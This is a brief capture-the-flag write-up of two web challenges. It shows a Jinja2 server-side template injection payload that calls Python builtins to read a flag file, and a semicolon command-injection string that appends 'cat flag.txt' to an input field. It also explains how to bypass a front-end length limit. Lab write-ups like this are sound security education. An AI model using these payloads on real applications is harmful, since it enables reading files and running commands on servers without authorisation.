# web

## Trial by Fire
> Solved by thewhiteh4t


- We have an input and a hint for SSTI `Can you read the runes? Perhaps 49 is the key.`
- On the battle result page we can see that SSTI is working


![](https://i.imgur.com/XcNrIpA.png)

- Payload :

```
    {{ request.__class__._load_form_data.__globals__.__builtins__.open("/app/flag.txt").read() }}
```

- Length of the input is restricted in the front-end, so we can either edit the length in inspect or simply use burp


![](https://i.imgur.com/aBge1Lj.png)

----------


## Whispers of the Moonbeam
> Solved by thewhiteh4t


- Hint of command injection is already given very clearly in the page
- Payload :

```
    gossip; cat flag.txt
```

![](https://i.imgur.com/TMZLUhN.png)


